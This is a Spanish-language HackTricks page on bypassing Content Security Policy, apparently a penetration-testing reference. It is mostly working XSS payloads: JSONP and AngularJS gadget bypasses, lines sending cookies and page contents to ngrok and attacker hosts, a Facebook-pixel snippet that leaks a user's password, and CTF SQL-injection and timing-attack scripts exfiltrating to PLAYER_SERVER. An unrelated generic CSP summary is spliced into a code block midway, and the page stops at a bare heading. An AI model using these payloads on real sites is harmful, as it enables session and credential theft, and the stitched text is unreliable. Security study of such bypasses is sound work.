# Evasi√≥n de la Pol√≠tica de Seguridad de Contenido (CSP)

<details>

<summary><strong>Aprende hacking en AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

¬°√önete al servidor de [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) para comunicarte con hackers experimentados y cazadores de recompensas por errores!

**Perspectivas de Hacking**\
Interact√∫a con contenido que profundiza en la emoci√≥n y los desaf√≠os del hacking

**Noticias de Hacking en Tiempo Real**\
Mantente al d√≠a con el mundo del hacking de ritmo r√°pido a trav√©s de noticias e insights en tiempo real

**√öltimos Anuncios**\
Mantente informado con los lanzamientos de nuevas recompensas por errores y actualizaciones cr√≠ticas de la plataforma

**√önete a nosotros en** [**Discord**](https://discord.com/invite/N3FrSbmwdy) y comienza a colaborar con los mejores hackers hoy mismo!

## Qu√© es CSP

La Pol√≠tica de Seguridad de Contenido o CSP es una tecnolog√≠a integrada en el navegador que **ayuda a proteger contra ataques como el scripting entre sitios (XSS)**. Enumera y describe rutas y fuentes, de las cuales el navegador puede cargar recursos de manera segura. Los recursos pueden incluir im√°genes, marcos, javascript y m√°s. Aqu√≠ hay un ejemplo de recursos que se permiten cargar y ejecutar desde el dominio local (self) y permitir funciones de ejecuci√≥n de c√≥digo en cadena como `eval`, `setTimeout` o `setInterval:`

La Pol√≠tica de Seguridad de Contenido se implementa a trav√©s de **encabezados de respuesta** o **elementos meta de la p√°gina HTML**. El navegador sigue la pol√≠tica recibida y bloquea activamente las violaciones a medida que se detectan.

Implementado a trav√©s del encabezado de respuesta:
```http
Content-Security-policy: default-src 'self'; img-src 'self' allowed-website.com; style-src 'self';
```
Implementado a trav√©s de la etiqueta meta:
```markup
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src 'none';">
```
### Encabezados

* `Content-Security-Policy`
* `Content-Security-Policy-Report-Only` Este no bloquear√° nada, solo enviar√° informes (usar en ambiente Pre).

## Definiendo recursos

CSP funciona restringiendo los or√≠genes desde donde se puede cargar contenido activo y pasivo. Adem√°s, puede restringir ciertos aspectos del contenido activo, como la ejecuci√≥n de javascript en l√≠nea y el uso de `eval()`.
```
default-src 'none';
img-src 'self';
script-src 'self' https://code.jquery.com;
style-src 'self';
report-uri /cspreport
font-src 'self' https://addons.cdn.mozilla.net;
frame-src 'self' https://ic.paypal.com https://paypal.com;
media-src https://videos.cdn.mozilla.net;
object-src 'none';
```
### Directivas

* **script-src**: Esta directiva especifica las fuentes permitidas para JavaScript. Esto incluye no solo URLs cargadas directamente en elementos, sino tambi√©n cosas como manejadores de eventos de script en l√≠nea (onclick) y hojas de estilo XSLT que pueden desencadenar la ejecuci√≥n de scripts.
* **default-src**: Esta directiva define la pol√≠tica para la obtenci√≥n de recursos por defecto. Cuando las directivas de obtenci√≥n est√°n ausentes en el encabezado CSP, el navegador sigue esta directiva por defecto.
* **Child-src**: Esta directiva define los recursos permitidos para trabajadores web y contenidos de marcos incrustados.
* **connect-src**: Esta directiva restringe las URLs para cargar usando interfaces como fetch, websocket, XMLHttpRequest.
* **frame-src**: Esta directiva restringe las URLs para marcos que pueden ser llamados.
* **frame-ancestors**: Esta directiva especifica las fuentes que pueden incrustar la p√°gina actual. Esta directiva se aplica a [`<frame>`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/frame), [`<iframe>`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe), [`<object>`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/object), [`<embed>`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/embed), o [`<applet>`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/applet). Esta directiva no se puede usar en etiquetas y se aplica solo a recursos no HTML.
* **img-src**: Define las fuentes permitidas para cargar im√°genes en la p√°gina web.
* **font-src**: La directiva especifica fuentes v√°lidas para fuentes cargadas usando `@font-face`.
* **manifest-src**: Esta directiva define las fuentes permitidas de archivos de manifiesto de aplicaciones.
* **media-src**: Define las fuentes permitidas de donde se pueden cargar objetos multimedia.
* **object-src**: Define las fuentes permitidas para los elementos \<object>, \<embed> y \<applet>.
* **base-uri**: Define las URLs permitidas que se pueden cargar usando un elemento.
* **form-action**: Esta directiva enumera los puntos finales v√°lidos para el env√≠o desde etiquetas.
* **plugin-types**: Define l√≠mites en los tipos de mime que una p√°gina puede invocar.
* **upgrade-insecure-requests**: Esta directiva instruye a los navegadores a reescribir esquemas de URL, cambiando HTTP por HTTPS. Esta directiva puede ser √∫til para sitios web con un gran n√∫mero de URLs antiguas que necesitan ser reescritas.
* **sandbox**: La directiva sandbox habilita un entorno aislado para el recurso solicitado similar al atributo sandbox. Aplica restricciones a las acciones de una p√°gina, incluyendo la prevenci√≥n de popups, la prevenci√≥n de la ejecuci√≥n de plugins y scripts, y la aplicaci√≥n de una pol√≠tica de mismo origen.

### **Fuentes**

* \*: Esto permite cualquier URL excepto esquemas `data:`, `blob:`, `filesystem:`.
* **self**: Esta fuente define que la carga de recursos en la p√°gina est√° permitida desde el mismo dominio.
* **data**: Esta fuente permite la carga de recursos a trav√©s del esquema data (por ejemplo, im√°genes codificadas en Base64).
* **none**: Esta directiva no permite la carga de nada desde ninguna fuente.
* **unsafe-eval**: Esto permite el uso de eval() y m√©todos similares para crear c√≥digo a partir de cadenas de texto. No es una pr√°ctica segura incluir esta fuente en ninguna directiva. Por la misma raz√≥n, se denomina insegura.
* **unsafe-hashes**: Esto permite habilitar manejadores de eventos en l√≠nea espec√≠ficos.
* **unsafe-inline**: Esto permite el uso de recursos en l√≠nea, como elementos en l√≠nea, URLs javascript:, manejadores de eventos en l√≠nea y elementos en l√≠nea. Nuevamente, esto no se recomienda por razones de seguridad.
* **nonce**: Una lista blanca para scripts en l√≠nea espec√≠ficos usando un nonce criptogr√°fico (n√∫mero utilizado una vez). El servidor debe generar un valor de nonce √∫nico cada vez que transmite una pol√≠tica.
* **sha256-\<hash>**: Lista blanca de scripts con un hash sha256 espec√≠fico.
* **strict-dynamic**: Permite al navegador cargar y ejecutar nuevas etiquetas JavaScript en el DOM desde cualquier fuente de script que previamente haya sido incluida en una lista blanca por un valor de "nonce" o "hash".
* **host**: Indica un host como example.com

## Reglas de CSP Inseguras

### 'unsafe-inline'
```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-inline';
```
Carga √∫til funcional: `"/><script>alert(1);</script>`

#### self + 'unsafe-inline' a trav√©s de Iframes

{% content-ref url="csp-bypass-self-+-unsafe-inline-with-iframes.md" %}
[csp-bypass-self-+-unsafe-inline-with-iframes.md](csp-bypass-self-+-unsafe-inline-with-iframes.md)
{% endcontent-ref %}

### 'unsafe-eval'
```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-eval';
```
Carga √∫til funcional:
```html
<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
```
### strict-dynamic

Si de alguna manera puedes hacer que un **c√≥digo JS permitido cree una nueva etiqueta de script** en el DOM con tu c√≥digo JS, debido a que un script permitido lo est√° creando, **se permitir√° la ejecuci√≥n de la nueva etiqueta de script**.

### Comod√≠n (\*)
```yaml
Content-Security-Policy: script-src 'self' https://google.com https: data *;
```
Carga √∫til funcional:
```markup
"/>'><script src=https://attacker-website.com/evil.js></script>
"/>'><script src=data:text/javascript,alert(1337)></script>
```
### Falta de object-src y default-src

{% hint style="danger" %}
**Parece que esto ya no funciona**
{% endhint %}
```yaml
Content-Security-Policy: script-src 'self' ;
```
Cargas √∫tiles funcionales:
```markup
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
">'><object type="application/x-shockwave-flash" data='https: //ajax.googleapis.com/ajax/libs/yui/2.8.0 r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e) {alert(1337)}//'>
<param name="AllowScriptAccess" value="always"></object>
```
### Carga de Archivos + 'self'
```yaml
Content-Security-Policy: script-src 'self';  object-src 'none' ;
```
Si puedes subir un archivo JS, puedes eludir esta CSP:

Payload funcional:
```markup
"/>'><script src="/uploads/picture.png.js"></script>
```
Sin embargo, es muy probable que el servidor est√© **validando el archivo subido** y solo permitir√° **subir tipos determinados de archivos**.

Adem√°s, incluso si pudieras subir un **c√≥digo JS dentro** de un archivo usando una extensi√≥n aceptada por el servidor (como: _script.png_), esto no ser√° suficiente porque algunos servidores como el servidor Apache **seleccionan el tipo MIME del archivo basado en la extensi√≥n** y navegadores como Chrome **rechazar√°n ejecutar c√≥digo Javascript** dentro de algo que deber√≠a ser una imagen. "Afortunadamente", hay errores. Por ejemplo, de un CTF aprend√≠ que **Apache no conoce** la extensi√≥n _**.wave**_, por lo tanto, no la sirve con un tipo MIME como audio/\***.

Desde aqu√≠, si encuentras un XSS y una carga de archivos, y logras encontrar una extensi√≥n **mal interpretada**, podr√≠as intentar subir un archivo con esa extensi√≥n y el contenido del script. O, si el servidor est√° comprobando el formato correcto del archivo subido, crear un pol√≠glota ([algunos ejemplos de pol√≠glotas aqu√≠](https://github.com/Polydet/polyglot-database)).

### Puntos finales de terceros + ('unsafe-eval')

{% hint style="warning" %}
Para algunos de los siguientes payload **ni siquiera se necesita `unsafe-eval`**.
{% endhint %}
```yaml
Content-Security-Policy: script-src https://cdnjs.cloudflare.com 'unsafe-eval';
```
Carga una versi√≥n vulnerable de angular y ejecuta JS arbitrario:
```markup
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
<div ng-app> {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1);//');}} </div>


"><script src="https://cdnjs.cloudflare.com/angular.min.js"></script> <div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>


"><script src="https://cdnjs.cloudflare.com/angularjs/1.1.3/angular.min.js"> </script>
<div ng-app ng-csp id=p ng-click=$event.view.alert(1337)>


With some bypasses from: https://blog.huli.tw/2022/08/29/en/intigriti-0822-xss-author-writeup/
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js></script>
<iframe/ng-app/ng-csp/srcdoc="
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.0/angular.js>
</script>
<img/ng-app/ng-csp/src/ng-o{{}}n-error=$event.target.ownerDocument.defaultView.alert($event.target.ownerDocument.domain)>"
>
```
#### Cargas √∫tiles usando Angular + una biblioteca con funciones que devuelven el objeto `window` ([consulta esta publicaci√≥n](https://blog.huli.tw/2022/09/01/en/angularjs-csp-bypass-cdnjs/)):

{% hint style="info" %}
La publicaci√≥n muestra que podr√≠as **cargar** todas las **bibliotecas** desde `cdn.cloudflare.com` (o cualquier otro repositorio permitido de bibliotecas JS), ejecutar todas las funciones a√±adidas de cada biblioteca y verificar **qu√© funciones de qu√© bibliotecas devuelven el objeto `window`**.
{% endhint %}
```markup
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js" /></script>
<div ng-app ng-csp>
{{$on.curry.call().alert(1)}}
{{[].empty.call().alert([].empty.call().document.domain)}}
{{ x = $on.curry.call().eval("fetch('http://localhost/index.php').then(d => {})") }}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{$on.curry.call().alert('xss')}}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{[].erase.call().alert('xss')}}
</div>



```
#### Abusando del c√≥digo JS de Google reCAPTCHA

Seg√∫n [**este writeup de CTF**](https://blog-huli-tw.translate.goog/2023/07/28/google-zer0pts-imaginary-ctf-2023-writeup/?\_x\_tr\_sl=es&\_x\_tr\_tl=en&\_x\_tr\_hl=es&\_x\_tr\_pto=wapp#noteninja-3-solves) puedes abusar de [https://www.google.com/recaptcha/](https://www.google.com/recaptcha/) dentro de un CSP para ejecutar c√≥digo JS arbitrario eludiendo el CSP:
```html
<div
ng-controller="CarouselController as c"
ng-init="c.init()"
>
&#91[c.element.ownerDocument.defaultView.parent.location="http://google.com?"+c.element.ownerDocument.cookie]]
<div carousel><div slides></div></div>

<script src="https://www.google.com/recaptcha/about/js/main.min.js"></script>
```
### Endpoints de terceros + JSONP
```http
Content-Security-Policy: script-src 'self' https://www.google.com https://www.youtube.com; object-src 'none';
```
Escenarios como este donde `script-src` est√° configurado para `self` y un dominio en particular que est√° en la lista blanca se pueden eludir utilizando JSONP. Los puntos finales de JSONP permiten m√©todos de callback inseguros que permiten a un atacante realizar XSS, payload funcional:
```markup
"><script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>
"><script src="/api/jsonp?callback=(function(){window.top.location.href=`http://f6a81b32f7f7.ngrok.io/cooookie`%2bdocument.cookie;})();//"></script>
```

```html
https://www.youtube.com/oembed?callback=alert;
<script src="https://www.youtube.com/oembed?url=http://www.youtube.com/watch?v=bDOYN-6gdRE&format=json&callback=fetch(`/profile`).then(function f1(r){return r.text()}).then(function f2(txt){location.href=`https://b520-49-245-33-142.ngrok.io?`+btoa(txt)})"></script>
```
[**JSONBee**](https://github.com/zigoo0/JSONBee) **contiene endpoints JSONP listos para usar para eludir la CSP de diferentes sitios web.**

La misma vulnerabilidad ocurrir√° si el **endpoint de confianza contiene una Redirecci√≥n Abierta** porque si el endpoint inicial es de confianza, las redirecciones tambi√©n lo son.

### Abusos de Terceros
Como se describe en el [siguiente post](https://sensepost.com/blog/2023/dress-code-the-talk/#bypasses), hay muchos dominios de terceros, que podr√≠an estar permitidos en alg√∫n lugar de la CSP, que pueden ser abusados para exfiltrar datos o ejecutar c√≥digo JavaScript. Algunos de estos terceros son:

| Entidad | Dominio Permitido | Capacidades |
|--------|-------------------|-------------|
| Facebook | www.facebook.com, *.facebook.com | Exfil |
| Hotjar | *.hotjar.com, ask.hotjar.io | Exfil |
| Jsdelivr | *.jsdelivr.com, cdn.jsdelivr.net | Ejec |
| Amazon CloudFront | *.cloudfront.net | Exfil, Ejec |
| Amazon AWS | *.amazonaws.com | Exfil, Ejec |
| Azure Websites | *.azurewebsites.net, *.azurestaticapps.net | Exfil, Ejec |
| Salesforce Heroku | *.herokuapp.com | Exfil, Ejec |
| Google Firebase | *.firebaseapp.com | Exfil, Ejec |

Si encuentras alguno de los dominios permitidos en la CSP de tu objetivo, es probable que puedas eludir la CSP registr√°ndote en el servicio de terceros y, o bien exfiltrar datos a ese servicio o ejecutar c√≥digo.

Por ejemplo, si encuentras la siguiente CSP:
```
Content-Security-Policy‚Äã: default-src 'self‚Äô www.facebook.com;‚Äã
```
# Bypass de la Pol√≠tica de Seguridad de Contenido (CSP)

## Resumen

La Pol√≠tica de Seguridad de Contenido (CSP) es una caracter√≠stica de seguridad que ayuda a prevenir ataques como Cross-Site Scripting (XSS) y la inyecci√≥n de datos. Sin embargo, puede ser burlada de varias maneras.

## T√©cnicas de Bypass

### Confianza en Dominios no Seguros

Si la CSP conf√≠a en scripts de dominios no seguros, un atacante podr√≠a aprovechar esto para cargar scripts maliciosos.

### Uso Incorrecto de `unsafe-inline`

El uso de `unsafe-inline` permite la ejecuci√≥n de scripts inline, lo que puede ser explotado por un atacante si la CSP no est√° configurada correctamente.

### Permisividad con `eval()`

La funci√≥n `eval()` es peligrosa porque ejecuta c√≥digo JavaScript representado como texto. Si CSP permite `eval()`, puede ser explotado.

### Directivas de Reporte

Las directivas de reporte pueden ser utilizadas para detectar violaciones de la CSP, pero no previenen el ataque en s√≠.

### Extensi√≥n de Protocolo

Los atacantes pueden utilizar extensiones de protocolo para eludir la CSP si las pol√≠ticas no est√°n bien definidas.

## Herramientas

- **CSP Evaluator**: Herramienta en l√≠nea para comprobar la seguridad de las pol√≠ticas CSP.
- **CSP Scanner**: Esc√°ner que analiza las cabeceras CSP de un sitio web.

## Conclusi√≥n

Es crucial implementar correctamente la CSP y mantenerla actualizada para protegerse contra los bypasses y otros vectores de ataque.
```
Content-Security-Policy‚Äã: connect-src www.facebook.com;‚Äã
```
Deber√≠as poder exfiltrar datos, de manera similar a como siempre se ha hecho con [Google Analytics](https://www.humansecurity.com/tech-engineering-blog/exfiltrating-users-private-data-using-google-analytics-to-bypass-csp)/[Google Tag Manager](https://blog.deteact.com/csp-bypass/). En este caso, sigue estos pasos generales:

1. Crea una cuenta de Facebook Developer aqu√≠.
1. Crea una nueva aplicaci√≥n "Facebook Login" y selecciona "Sitio web".
1. Ve a "Configuraci√≥n -> B√°sico" y obt√©n tu "App ID".
1. En el sitio objetivo del cual quieres exfiltrar datos, puedes exfiltrar datos utilizando directamente el gadget del SDK de Facebook "fbq" a trav√©s de un "customEvent" y el payload de datos.
1. Ve al "Event Manager" de tu aplicaci√≥n y selecciona la aplicaci√≥n que creaste (nota que el event manager podr√≠a encontrarse en una URL similar a esta: https://www.facebook.com/events_manager2/list/pixel/[app-id]/test_events
1. Selecciona la pesta√±a "Test Events" para ver los eventos enviados por "tu" sitio web.

Luego, en el lado de la v√≠ctima, ejecutas el siguiente c√≥digo para inicializar el pixel de seguimiento de Facebook apuntando a la app-id de la cuenta de desarrollador de Facebook del atacante y emitir un evento personalizado de esta manera:
```JavaScript
fbq('init', '1279785999289471');‚Äã // this number should be the App ID of the attacker's Meta/Facebook account
fbq('trackCustom', 'My-Custom-Event',{‚Äã
data: "Leaked user password: '"+document.getElementById('user-password').innerText+"'"‚Äã
});
```
### Bypass a trav√©s de RPO (Sobrescritura de Ruta Relativa) <a href="#bypass-via-rpo-relative-path-overwrite" id="bypass-via-rpo-relative-path-overwrite"></a>

Adem√°s de la redirecci√≥n mencionada anteriormente para eludir las restricciones de ruta, existe otra t√©cnica llamada Sobrescritura de Ruta Relativa (RPO) que se puede utilizar en algunos servidores.

Por ejemplo, si CSP permite la ruta `https://example.com/scripts/react/`, se puede eludir de la siguiente manera:
```html
<script src="https://example.com/scripts/react/..%2fangular%2fangular.js"></script>
```
El navegador finalmente cargar√° `https://example.com/scripts/angular/angular.js`.

Esto funciona porque para el navegador, est√°s cargando un archivo llamado `..%2fangular%2fangular.js` ubicado bajo `https://example.com/scripts/react/`, lo cual est√° en conformidad con CSP.

Sin embargo, para ciertos servidores, al recibir la solicitud, la decodificar√°n, solicitando efectivamente `https://example.com/scripts/react/../angular/angular.js`, lo cual es equivalente a `https://example.com/scripts/angular/angular.js`.

Al **explotar esta inconsistencia en la interpretaci√≥n de URL entre el navegador y el servidor, se pueden eludir las reglas de ruta**.

La soluci√≥n es no tratar `%2f` como `/` en el lado del servidor, asegurando una interpretaci√≥n consistente entre el navegador y el servidor para evitar este problema.

Ejemplo en l√≠nea:[ ](https://jsbin.com/werevijewa/edit?html,output)[https://jsbin.com/werevijewa/edit?html,output](https://jsbin.com/werevijewa/edit?html,output)

### Ejecuci√≥n de JS en iframes

{% content-ref url="../xss-cross-site-scripting/iframes-in-xss-and-csp.md" %}
[iframes-in-xss-and-csp.md](../xss-cross-site-scripting/iframes-in-xss-and-csp.md)
{% endcontent-ref %}

### falta de **base-uri**

Si falta la directiva **base-uri**, puedes abusar de ella para realizar una [**inyecci√≥n de marcado pendiente**](../dangling-markup-html-scriptless-injection/).

Adem√°s, si la **p√°gina est√° cargando un script usando una ruta relativa** (como `<script src="/js/app.js">`) utilizando un **Nonce**, puedes abusar de la etiqueta **base** para hacer que **cargue** el script desde **tu propio servidor logrando un XSS.**\
Si la p√°gina vulnerable se carga con **httpS**, utiliza una URL httpS en la base.
```html
<base href="https://www.attacker.com/">
```
### Eventos AngularJS

Dependiendo de la pol√≠tica espec√≠fica, el CSP bloquear√° eventos de JavaScript. Sin embargo, AngularJS define sus propios eventos que se pueden utilizar en su lugar. Cuando se est√° dentro de un evento, AngularJS define un objeto especial `$event`, que simplemente hace referencia al objeto de evento del navegador. Puedes usar este objeto para realizar un bypass de CSP. En Chrome, hay una propiedad especial en el objeto `$event/event` llamada `path`. Esta propiedad contiene un arreglo de objetos que provocan la ejecuci√≥n del evento. La √∫ltima propiedad es siempre el objeto `window`, que podemos usar para realizar una fuga de sandbox. Al pasar este arreglo al filtro `orderBy`, podemos enumerar el arreglo y usar el √∫ltimo elemento (el objeto `window`) para ejecutar una funci√≥n global, como `alert()`. El siguiente c√≥digo demuestra esto:
```markup
<input%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27>#x
?search=<input id=x ng-focus=$event.path|orderBy:'(z=alert)(document.cookie)'>#x
```
**Encuentra otros bypasses de Angular en** [**https://portswigger.net/web-security/cross-site-scripting/cheat-sheet**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

### AngularJS y dominio en lista blanca
```
Content-Security-Policy: script-src 'self' ajax.googleapis.com; object-src 'none' ;report-uri /Report-parsing-url;
```
Si la aplicaci√≥n utiliza Angular JS y los scripts se cargan desde un dominio en la lista blanca, es posible eludir esta pol√≠tica de CSP llamando a funciones de callback y clases vulnerables. Para m√°s detalles, visita este incre√≠ble repositorio de [git](https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh\*t,-it's-CSP!%22).

Cargas √∫tiles funcionales:
```html
<script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337></script>
ng-app"ng-csp ng-click=$event.view.alert(1337)><script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script>

<!-- no longer working -->
<script src="https://www.googleapis.com/customsearch/v1?callback=alert(1)">
```
### Evasi√≥n mediante Redirecci√≥n

¬øQu√© sucede cuando CSP se encuentra con una redirecci√≥n del lado del servidor? Si la redirecci√≥n conduce a un origen diferente que no est√° permitido, a√∫n fallar√°.

Sin embargo, seg√∫n la descripci√≥n en [CSP spec 4.2.2.3. Rutas y Redirecciones](https://www.w3.org/TR/CSP2/#source-list-paths-and-redirects), si la redirecci√≥n conduce a una ruta diferente, puede evadir las restricciones originales.

Aqu√≠ hay un ejemplo:
```html
<!DOCTYPE html>
<html>
<head>
<meta http-equiv="Content-Security-Policy" content="script-src http://localhost:5555 https://www.google.com/a/b/c/d">
</head>
<body>
<div id=userContent>
<script src="https://https://www.google.com/test"></script>
<script src="https://https://www.google.com/a/test"></script>
<script src="http://localhost:5555/301"></script>
</div>
</body>
</html>
```
Si CSP est√° configurado para `https://www.google.com/a/b/c/d`, dado que se considera la ruta, tanto los scripts `/test` como `/a/test` ser√°n bloqueados por CSP.

Sin embargo, el √∫ltimo `http://localhost:5555/301` ser√° **redirigido en el servidor a `https://www.google.com/complete/search?client=chrome&q=123&jsonp=alert(1)//`**. Dado que es una redirecci√≥n, **no se considera la ruta**, y el **script puede cargarse**, eludiendo as√≠ la restricci√≥n de la ruta.

Con esta redirecci√≥n, incluso si la ruta est√° especificada completamente, a√∫n ser√° eludida.

Por lo tanto, la mejor soluci√≥n es asegurarse de que el sitio web no tenga vulnerabilidades de redirecci√≥n abierta y que no haya dominios que puedan ser explotados en las reglas de CSP.

### Eludir CSP con marcado colgante

Lee [c√≥mo aqu√≠](../dangling-markup-html-scriptless-injection/).

### 'unsafe-inline'; img-src \*; a trav√©s de XSS
```
default-src 'self' 'unsafe-inline'; img-src *;
```
```markdown
`'unsafe-inline'` significa que puedes ejecutar cualquier script dentro del c√≥digo (XSS puede ejecutar c√≥digo) y `img-src *` significa que puedes usar en la p√°gina web cualquier imagen de cualquier recurso.

Puedes eludir esta CSP exfiltrando los datos a trav√©s de im√°genes (en esta ocasi√≥n el XSS abusa de un CSRF donde una p√°gina accesible por el bot contiene un SQLi, y extrae la bandera a trav√©s de una imagen):
```
```javascript
<script>fetch('http://x-oracle-v0.nn9ed.ka0labs.org/admin/search/x%27%20union%20select%20flag%20from%20challenge%23').then(_=>_.text()).then(_=>new Image().src='http://PLAYER_SERVER/?'+_)</script>
```
Desde: [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

Tambi√©n podr√≠as abusar de esta configuraci√≥n para **cargar c√≥digo javascript insertado dentro de una imagen**. Si, por ejemplo, la p√°gina permite cargar im√°genes de Twitter. Podr√≠as **crear** una **imagen especial**, **subirla** a Twitter y abusar de "**unsafe-inline**" para **ejecutar** un c√≥digo JS (como un XSS regular) que **cargar√°** la **imagen**, **extraer√°** el **JS** de ella y **lo ejecutar√°**: [https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/](https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/)

### Con Service Workers

La funci√≥n **`importScripts`** de los Service Workers no est√° limitada por CSP:

{% content-ref url="../xss-cross-site-scripting/abusing-service-workers.md" %}
[abusing-service-workers.md](../xss-cross-site-scripting/abusing-service-workers.md)
{% endcontent-ref %}

### Inyecci√≥n de Pol√≠tica

**Investigaci√≥n:** [**https://portswigger.net/research/bypassing-csp-with-policy-injection**](https://portswigger.net/research/bypassing-csp-with-policy-injection)

#### Chrome

Si un **par√°metro** enviado por ti est√° siendo **pegado dentro** de la **declaraci√≥n** de la **pol√≠tica,** entonces podr√≠as **alterar** la **pol√≠tica** de alguna manera que la haga **in√∫til**. Podr√≠as **permitir script 'unsafe-inline'** con cualquiera de estos bypasses:
```bash
script-src-elem *; script-src-attr *
script-src-elem 'unsafe-inline'; script-src-attr 'unsafe-inline'
```
Debido a que esta directiva **sobrescribir√° las directivas script-src existentes**.\
Puedes encontrar un ejemplo aqu√≠: [http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=%3Bscript-src-elem+\*\&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E](http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=%3Bscript-src-elem+\*\&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E)

#### Edge

En Edge es mucho m√°s simple. Si puedes agregar en el CSP solo esto: **`;_`** **Edge** **descartar√°** toda la **pol√≠tica**.\
Ejemplo: [http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=;\_\&y=%3Cscript%3Ealert(1)%3C/script%3E](http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=;\_\&y=%3Cscript%3Ealert\(1\)%3C/script%3E)

### img-src \*; v√≠a XSS (iframe) - Ataque de tiempo

Observa la falta de la directiva `'unsafe-inline'`\
Esta vez puedes hacer que la v√≠ctima **cargue** una p√°gina **bajo tu control** a trav√©s de **XSS** con un `<iframe>`. En esta ocasi√≥n vas a hacer que la v√≠ctima acceda a la p√°gina desde donde quieres extraer informaci√≥n (**CSRF**). No puedes acceder al contenido de la p√°gina, pero si de alguna manera puedes **controlar el tiempo que la p√°gina tarda en cargar**, podr√°s extraer la informaci√≥n que necesitas.

Esta vez se va a extraer una **bandera**, cada vez que un **car√°cter se adivine correctamente** a trav√©s de SQLi, la **respuesta** tardar√° **m√°s tiempo** debido a la funci√≥n de sleep. Entonces, podr√°s extraer la bandera:
```javascript
<iframe name=f id=g></iframe> // The bot will load an URL with the payload
<script>
let host = "http://x-oracle-v1.nn9ed.ka0labs.org";
function gen(x) {
x = escape(x.replace(/_/g, '\\_'));
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag%20like%20'${x}%25'and%201=sleep(0.1)%23`;
}

function gen2(x) {
x = escape(x);
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag='${x}'and%201=sleep(0.1)%23`;
}

async function query(word, end=false) {
let h = performance.now();
f.location = (end ? gen2(word) : gen(word));
await new Promise(r => {
g.onload = r;
});
let diff = performance.now() - h;
return diff > 300;
}

let alphabet = '_abcdefghijklmnopqrstuvwxyz0123456789'.split('');
let postfix = '}'

async function run() {
let prefix = 'nn9ed{';
while (true) {
let i = 0;
for (i;i<alphabet.length;i++) {
let c = alphabet[i];
let t =  await query(prefix+c); // Check what chars returns TRUE or FALSE
console.log(prefix, c, t);
if (t) {
console.log('FOUND!')
prefix += c;
break;
}
}
if (i==alphabet.length) {
console.log('missing chars');
break;
}
let t = await query(prefix+'}', true);
if (t) {
prefix += '}';
break;
}
}
new Image().src = 'http://PLAYER_SERVER/?' + prefix; //Exfiltrate the flag
console.log(prefix);
}

run();
</script>
```
### A trav√©s de Bookmarklets

